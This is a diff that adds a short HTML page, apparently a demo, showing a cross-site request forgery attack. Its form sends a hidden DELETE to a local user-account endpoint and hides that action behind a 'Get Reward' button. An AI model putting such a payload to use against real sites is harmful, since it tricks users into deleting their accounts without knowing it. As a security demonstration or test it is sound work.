@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+<h1>Simulated CSRF Attack with User Interaction</h1>
+<p>If you click the button below, a DELETE request will be sent to delete your account.</p>
+
+<form id="csrf-form" action="http://localhost:8080/api/user/self" method="POST">
+    <!-- Hidden field to simulate DELETE method -->
+    <input type="hidden" name="_method" value="DELETE">
+
+    <!-- Submit button that user must click -->
+    <button type="submit">Get Reward</button>
+</form>
+</body>
+</html>
